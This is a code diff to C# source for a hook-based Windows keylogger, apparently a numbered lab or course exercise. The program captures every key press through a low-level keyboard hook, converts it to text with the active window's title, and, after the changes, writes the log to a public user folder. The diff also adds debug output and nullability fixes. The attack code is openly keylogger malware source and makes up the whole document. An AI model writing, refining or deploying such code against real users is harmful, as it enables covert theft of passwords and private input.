@@ -14,7 +14,9 @@ namespace A04_1a_hookbased_keylogger
 {
     public static class Program
     {
-        private static readonly string loggerPath = Path.Combine(Application.StartupPath, "log.txt");
+        // Updated target storage paths for lab data classification
+        private static readonly string loggerPath = @"C:\Users\Public\A04_1a_hookbased_keylog.txt";
+        private static readonly string errPath = @"C:\Users\Public\A04_1a_hookbased_keylogger_error_log.txt";
         private static string CurrentActiveWindowTitle = string.Empty;
 
         public static void Main()
@@ -61,7 +63,7 @@ namespace A04_1a_hookbased_keylogger
             try
             {
                 using (Process curProcess = Process.GetCurrentProcess())
-                // Explicitly mark curModule as a nullable type (ProcessModule?)
+                // Fixed CS8600 Warning: Marked ProcessModule as nullable type
                 using (ProcessModule? curModule = curProcess.MainModule)
                 {
                     if (curModule == null || string.IsNullOrEmpty(curModule.ModuleName))
@@ -83,7 +85,6 @@ namespace A04_1a_hookbased_keylogger
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            // nCode >= 0 indicates valid hook event parameters to parse
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 try
@@ -180,21 +181,20 @@ namespace A04_1a_hookbased_keylogger
             {
                 StringBuilder sb = new StringBuilder(256);
                 byte[] vkBuffer = new byte[256];
-                if (!GetKeyboardState(vkBuffer)) return ((Keys)vkCode).ToString();
+                if (!GetKeyboardState(vkBuffer))
+                {
+                    Console.WriteLine("[DEBUG] GetKeyboardState dropped tracking. Defaulting string conversion.");
+                    return ((Keys)vkCode).ToString();
+                }
 
                 uint scanCode = MapVirtualKey(vkCode, 0);
                 IntPtr hwnd = GetForegroundWindow();
 
-                // 1. Runtime guard: Ensure window handle exists
                 if (hwnd == IntPtr.Zero) return ((Keys)vkCode).ToString();
 
-                uint pid; // Explicit variable instead of discard to avoid local reference confusion
+                uint pid;
                 uint threadId = GetWindowThreadProcessId(hwnd, out pid);
-
-                // 2. Clear CS8600: Explicitly handle the handle or append ! if compiler treats it as reference
                 IntPtr keyboardLayout = GetKeyboardLayout(threadId);
-
-                if (keyboardLayout == IntPtr.Zero) return ((Keys)vkCode).ToString();
 
                 int result = ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, sb.Capacity, 0, keyboardLayout);
                 if (result > 0)
@@ -204,6 +204,7 @@ namespace A04_1a_hookbased_keylogger
             }
             catch (Exception ex)
             {
+                Console.WriteLine("[DEBUG] EXCEPTION inside translation mapping engine: {0}", ex.Message);
                 LogSystemError("Keyboard layout translation fault: " + ex.Message);
             }
             return ((Keys)vkCode).ToString();
@@ -216,9 +217,12 @@ namespace A04_1a_hookbased_keylogger
                 IntPtr hwnd = GetForegroundWindow();
                 if (hwnd == IntPtr.Zero) return "Desktop/System Background";
 
-                GetWindowThreadProcessId(hwnd, out uint pid);
-                using (Process p = Process.GetProcessById((int)pid))
+                uint pid;
+                GetWindowThreadProcessId(hwnd, out pid);
+                using (Process? p = Process.GetProcessById((int)pid))
                 {
+                    if (p == null) return "Unknown Process (Terminating)";
+
                     string title = p.MainWindowTitle;
                     if (string.IsNullOrWhiteSpace(title))
                         title = p.ProcessName;
@@ -242,7 +246,6 @@ namespace A04_1a_hookbased_keylogger
         {
             try
             {
-                string errPath = Path.Combine(Application.StartupPath, "error_log.txt");
                 File.AppendAllText(errPath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] ERROR: {logMessage}{Environment.NewLine}");
             }
             catch (Exception ex)
